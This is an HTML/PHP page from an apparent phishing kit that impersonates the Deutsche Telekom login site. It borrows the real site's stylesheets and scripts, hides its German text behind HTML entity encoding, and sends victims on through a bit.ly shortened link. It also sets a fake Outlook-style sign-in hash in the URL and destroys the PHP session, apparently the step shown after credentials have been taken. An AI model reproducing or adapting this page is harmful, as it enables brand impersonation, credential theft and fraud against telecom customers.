
<!DOCTYPE html>
<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]-->








<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>&#84;&#101;l&#101;k&#111;&#109; &#76;&#111;&#103;&#105;&#110;</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />

    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/login-24.03.0.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/html5shiv.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/login.js"></script>
    
    <style>
      .img1{
	   width:400px;
	   overflow:hidden;
	   margin:0 auto;	  
	}
	.img2{
	   width:400px;
	   overflow:hidden;
	   margin:1em auto;
	   padding:2em 1em;	  
	}
	.heading1{
	  width:100%;
	  overflow:hidden;
	  font-family:Verdana, Geneva, sans-serif;
	  font-size:15px;
	  font-weight:600;
	  text-align:center;
	  padding:2em 0;
	  cursor:pointer;	
	}
	.heading1:hover{
	  background-color:#f9f6f3;	
	}
	.h-body{
	  width:100%;
	  overflow:hidden;
	  font-family:Verdana, Geneva, sans-serif;
	  font-size:15px;
	  font-weight:600;
	}
	.c-space{
	  width:100%;
	  height:70px;	
	}

    #tbs-header{
            background-color: hsl(330deg 100% 45%);
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            padding: 18px 10px 10px 15px;
    }
    #tbs-header-content{
        display: flex;
    flex-direction: row;
    justify-content: space-between;
    width: 100%;
    align-items: center;
    text-align: center;
    margin: 10px 160px;
    }
    .head-img{
          width: 20%;
          height: 100%;
    }
    .head-img > img{
          width: 74%;
    }
    .head-txt > p{
    color: #fff;
    font-size: small;
    font-family: inherit;
    font-weight: 800;
    }
    #fix-head{
         display: flex;
         flex-direction: row;
         justify-content: space-between;
         align-items: center;
    }
    .tell-con{
     display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    margin: 10px 219px;
    height: 100%;
    padding-top: 39px;
  
    }
    .telstyle{
         font-size: 18px;
         font-family: sans-serif;
         font-weight: 500px;
    }

    .footercon{
     display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    height: 100%;
    max-width: 1088px;
    margin: 7px 125px;
    /*padding-top: 50px;*/
        }
        .footer-inner{
        display: flex;
        flex-direction: row;
        justify-content: space-between;
        margin: 1px 19px;
        }

    </style>
    
</head>

<body style="margin: 0;padding: 0;">

<header id="tbs-header">
        <div id="tbs-header-content">
                <div class="head-img"> 
                     <img src="assets/ddddd.png">
                </div>
            <div class="head-txt">
                <p>ERLEBEN, WAS VERBINDET.</p>
            </div>
        </div>
        <hr>
</header>

    <header id="fix-head">
    <div class="tell-con">
           <div class="telstyle">TELEKOM LOGIN</div>
           <div>Hilfe</div>
  </div>
    </header>

    <hr>

     <div class="c-space">
         
     </div>
    <div class="img1">
        <div class="heading1"></div>
    </div>
    <div class="img2">
        <div class="h-body">
		  <p style="font-family:Arial, Helvetica, sans-serif;font-size:14px;color:#117aca; margin:1em 0"></p>
          <p style="font-family:Arial, Helvetica, sans-serif;font-size:14px;color:#117aca; margin:1em 0">&#86;&#105;&#101;&#108;&#101;&#110; &#68;&#97;&#110;&#107; &#102;&uuml;&#114; &#73;&#104;&#114;&#101;&#110; &#66;&#101;&#115;&#117;&#99;&#104; &#98;&#101;&#105; &#84;&#101;&#108;&#101;&#107;&#111;&#109;<sup><font size="2">&reg;</font></sup>&nbsp; &#104;&#105;&#108;&#105;&#102;&#101;</p>
          <p style="font-family:Arial, Helvetica, sans-serif;font-size:10px;color:#666666; margin:1em 0">&#87;&#101;&#110;&#110; &#119;&#105;&#114; &#119;&#101;&#105;&#116;&#101;&#114;&#101; &#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#101;&#110; &#98;&#101;&#110;&ouml;&#116;&#105;&#103;&#101;&#110;, &#114;&#117;&#102;&#101;&#110; &#119;&#105;&#114; &#83;&#105;&#101; &#97;&#110;.</p>
          
        </div>
    </div>
	<center style="padding-bottom: 60px"><a style="border-radius: 3px; font-size: 15px; color: white; border: 1px #1373b5 solid; box-shadow: inset 0 1px 0 #e20074;, inset 1px 0 0 #48a1e2; text-decoration: none; padding: 8px 7px 8px 7px; width: 210px; max-width: 210px; font-family: proxima_nova, 'Open Sans', 'lucida grande', 'Segoe UI', arial, verdana, 'lucida sans unicode', tahoma, sans-serif; margin: 6px auto; display: block; background-color: #e20074; text-align: center;" href="https://bit.ly/3uOPT3W">W&#101;&#105;&#116;&#101;&#114; &#122;&#117;&#109; &#109;&#101;&#105;&#110;&#101; K&#111;&#110;&#116;&#111;</a></center>
</center>
<script>
  
  location.hash = '&t-online=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&t-online=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&t-online=out&t-online=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain='
  
</script>
         <hr style="padding-bottom: 10px;">

      <div class="footercon">
           <div>©Telekom Deutschland Gmbh</div>
           <div class="footer-inner">
               <p>Impressum</p>
               <p>Datenschutz</p>
           </div>
      </div>
</body>
<?php
@session_start();
@session_destroy();
?>
</html>